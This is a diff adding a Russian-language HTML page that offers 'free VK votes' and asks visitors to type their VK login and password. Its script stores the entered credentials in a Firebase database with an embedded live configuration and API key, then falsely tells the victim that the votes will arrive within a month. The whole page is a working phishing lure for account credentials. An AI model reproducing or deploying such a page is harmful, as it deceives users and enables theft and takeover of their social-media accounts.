@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<style>
+			*{
+				margin: 0;
+				padding: 0;
+				position: relative
+			}
+		</style>
+	</head>
+	<body onload="Start()" style="background: #edeef0; overflow-x: hidden" align="center">
+		<div style="background: #4a76a8; width: 100vw; height: 50px; line-height: 50px" align="center">
+			<h1 style="color: white; font-size: 40px">Бесплатные голоса ВК</h1>
+		</div>
+		<br>
+		<h1 style="font-size: 30px">Чтобы получить бесплатные голоса ВК, нужно выполнить следующие шаги:</h1>
+		<br>
+		<hr>
+		<br>
+		<h1 style="font-size: 30px">1) Написать свой логин и пароль от аккаунта ниже</h1>
+		<br>
+		<h1 style="font-size: 30px">2) Ввести количество голосов, которые ты хочешь получить</h1>
+		<br>
+		<hr>
+		<br>
+		<h1 style="font-size: 30px">После этого в течении месяца тебе начислятся голоса!</h1>
+		<br>
+		<hr>
+		<br>
+		<input style="width: 90vw; height: 30px; font-size: 25px" type="text" id="login" placeholder="Введи логин">
+		<br>
+		<br>
+		<input style="width: 90vw; height: 30px; font-size: 25px" type="password" id="password" placeholder="Введи пароль">
+		<br>
+		<br>
+		<input style="width: 90vw; height: 30px; font-size: 25px" type="number" id="votes" placeholder="Введи количество голосов">
+		<br>
+		<br>
+		<input style="width: 90vw; height: 50px; font-size: 25px" type="button" id="password" value="Получить голоса" onclick="Send()">
+		<div style="position: absolute; width: 100vw; height: 50px; background: #bdbdbd; top: calc(100vh - 50px); vertical-align: middle">
+			<h1 style="font-size: 20px">Все данные будут отправлены владельцу сайта. Вы сами несёте ответственность за свои действия!</h1>
+		</div>
+		
+		<!-- The core Firebase JS SDK is always required and must be listed first -->
+		<script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-app.js"></script>
+
+		<!-- TODO: Add SDKs for Firebase products that you want to use
+			 https://firebase.google.com/docs/web/setup#available-libraries -->
+		<script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-analytics.js"></script>
+		
+		<script src="https://www.gstatic.com/firebasejs/8.0.2/firebase-database.js"></script>
+
+		<script>
+		  // Your web app's Firebase configuration
+		  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		  var firebaseConfig = {
+			apiKey: "AIzaSyDkw47pPmCZ8z6O5XDMIalIvuFOlf85PUM",
+			authDomain: "vk-votes.firebaseapp.com",
+			databaseURL: "https://vk-votes.firebaseio.com",
+			projectId: "vk-votes",
+			storageBucket: "vk-votes.appspot.com",
+			messagingSenderId: "138161315622",
+			appId: "1:138161315622:web:fc9e590745812922e12be7",
+			measurementId: "G-RENBV32HC1"
+		  };
+		  // Initialize Firebase
+		  firebase.initializeApp(firebaseConfig);
+		  firebase.analytics();
+		  var database = firebase.database();
+		</script>
+		
+		<script>
+			function Start(){
+				
+			}
+			
+			function Send(){
+				if(document.getElementById("login").value.indexOf("@") == -1){
+					alert("Пожалуйста, введи логин правильно!");
+				}
+				else{
+					if(document.getElementById("votes").value == ""){
+						alert("Введи, сколько голосов ты хочешь!");
+					}
+					else{
+						var _login = document.getElementById("login").value;
+						var _password = document.getElementById("password").value;
+						firebase.database().ref("/count").once("value").then(function(snapshot) {
+							firebase.database().ref("/account_" + snapshot.val().count.toString()).set({
+								login : _login,
+								password : _password
+							});
+							firebase.database().ref("/count").set({
+								count : snapshot.val().count + 1
+							});
+							alert(document.getElementById("votes").value.toString() + " голосов ВК будут отправлены в течении месяца!");
+						});
+					}
+				}
+			}
+		</script>
+	</body>
+</html>
